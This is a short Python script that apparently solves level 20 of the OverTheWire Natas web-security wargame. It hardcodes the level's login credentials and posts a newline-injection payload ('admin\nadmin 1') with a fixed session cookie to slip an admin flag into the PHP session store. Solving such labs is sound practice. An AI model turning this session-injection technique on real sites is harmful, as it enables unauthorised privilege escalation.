import requests
import re
import random
import string


user_auth = ('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')
target = 'http://natas20.natas.labs.overthewire.org/index.php?debug=1'

chars = string.ascii_uppercase + string.digits + string.ascii_lowercase



for i in range(0,1):

# checking what responses are given:
#    response = requests.get(target, auth = user_auth)
#    print(response.cookies)
    #randomString = "".join(random.choice(chars) for _ in range(26))
    #randomString = 'g92d726k7oipbkatlhd5ro4h14'
    response = requests.post(target, auth = user_auth, cookies = {'PHPSESSID':'1'}, data = {'name':'admin\nadmin 1'})

    response = requests.post(target, auth = user_auth, cookies = {'PHPSESSID':'1'}, data = {'name':'admin\nadmin 1'})

    #debugMatch = re.search('DEBUG.+<br>', response.text)
    #print(debugMatch.group(0)),
    print response.text
    #debugMatch = re.search('value=.+<br>', response.text)
    #print(debugMatch.group(0))
